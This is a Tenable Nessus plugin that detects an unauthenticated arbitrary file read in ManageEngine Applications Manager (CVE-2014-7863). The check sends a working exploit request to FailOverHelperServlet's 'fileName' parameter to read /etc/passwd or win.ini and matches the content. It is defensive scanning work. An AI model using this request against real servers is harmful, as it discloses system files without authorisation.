#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(84017);
  script_version("$Revision: 1.2 $");
  script_cvs_date("$Date: 2015/06/09 15:36:50 $");

  script_cve_id("CVE-2014-7863");
  script_bugtraq_id(74402);
  script_osvdb_id(117695);

  script_name(english:"ManageEngine Applications Manager FailOverHelperServlet 'fileName' Parameter Arbitrary File Disclosure");
  script_summary(english:"Attempts to read a local file.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server is running an application that is affected by an
information disclosure vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of ManageEngine Applications Manager running on remote
web server is affected by a file disclosure vulnerability due to a
failure to properly sanitize user-supplied input to the 'fileName'
parameter of the FailOverHelperServlet script. A remote,
unauthenticated attacker, using a crafted request, can exploit this to
view arbitrary files.");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2015/Jan/114");
  script_set_attribute(attribute:"see_also", value:"https://www.manageengine.com/products/applications_manager/issues.html");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Applications Manager version 11 Build 11912.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"vuln_publication_date", value:"2015/01/28");
  script_set_attribute(attribute:"patch_publication_date", value:"2015/01/28");
  script_set_attribute(attribute:"plugin_publication_date", value:"2015/06/08");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe",value:"cpe:/a:manageengine:applications_manager");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2015 Tenable Network Security, Inc.");

  script_dependencies("manageengine_applications_manager_detect.nasl");
  script_require_keys("installed_sw/ManageEngine Applications Manager");
  script_require_ports("Services/www", 9090);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = "ManageEngine Applications Manager";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:9090);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

# Establish a session first
res = http_send_recv3(
  method : "GET",
  port   : port,
  item   : dir,
  exit_on_fail : TRUE
);

dir = dir - "/index.do";
url = "/servlet/FailOverHelperServlet?operation=copyfile&fileName=";

# Determine what to look for.
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os)
    files = make_list('/windows/win.ini','/winnt/win.ini');
  else
    files = make_list('/etc/passwd');
}
else files = make_list('/etc/passwd', '/windows/win.ini', '/winnt/win.ini');

file_pats = make_array();
file_pats['/etc/passwd'] = "root:.*:0:[01]:";
file_pats['/winnt/win.ini'] = "^\[[a-zA-Z\s]+\]|^; for 16-bit app support";
file_pats['/windows/win.ini'] = "^\[[a-zA-Z\s]+\]|^; for 16-bit app support";

vuln = FALSE;

foreach file (files)
{
  res = http_send_recv3(
    method : "POST",
    port   : port,
    item   : dir + url + file,
    data   : '',
    exit_on_fail : TRUE
  );
  if (egrep(pattern:file_pats[file], string:res[2]))
  {
    vuln = TRUE;
    break;
  }
}
if (!vuln)
  audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);

security_report_v4(
  port        : port,
  severity    : SECURITY_WARNING,
  file        : file,
  request     : make_list(http_last_sent_request()),
  output      : chomp(res[2]),
  attach_type : 'text/plain'
);
exit(0);
